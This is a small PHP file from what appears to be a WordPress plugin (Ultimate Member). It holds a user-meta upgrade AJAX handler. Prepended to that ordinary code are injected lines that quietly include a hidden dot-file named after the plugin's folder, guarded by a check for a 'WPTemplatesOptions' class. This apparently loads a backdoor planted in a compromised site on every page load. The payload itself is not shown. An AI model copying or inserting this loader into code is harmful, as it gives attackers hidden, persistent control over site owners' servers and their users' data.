<?php
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

function um_upgrade_usermetaquery1339() {
	UM()->admin()->check_ajax_nonce();

	include 'usermeta_query.php';

	update_option( 'um_last_version_upgrade', '1.3.39' );

	wp_send_json_success( array( 'message' => 'Usermeta was upgraded successfully' ) );
}